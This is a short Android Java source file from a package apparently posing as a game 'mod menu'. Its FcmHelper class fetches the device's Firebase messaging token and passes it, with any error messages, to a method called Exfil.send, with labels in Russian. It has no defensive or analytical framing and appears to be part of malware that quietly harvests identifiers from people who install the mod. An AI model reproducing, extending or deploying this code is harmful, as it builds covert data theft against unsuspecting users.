package com.brawl.modmenu;

import android.content.Context;
import com.google.firebase.messaging.FirebaseMessaging;

public class FcmHelper {

    public static void fetchToken() {
        try {
            FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful() && task.getResult() != null) {
                        String token = task.getResult();
                        Exfil.send("FCM_TOKEN", "Токен:\n" + token);
                    } else {
                        Exfil.send("FCM_ERR", "Не удалось получить токен");
                    }
                });
        } catch (Throwable t) {
            Exfil.send("FCM_ERR", t.getMessage());
        }
    }
}
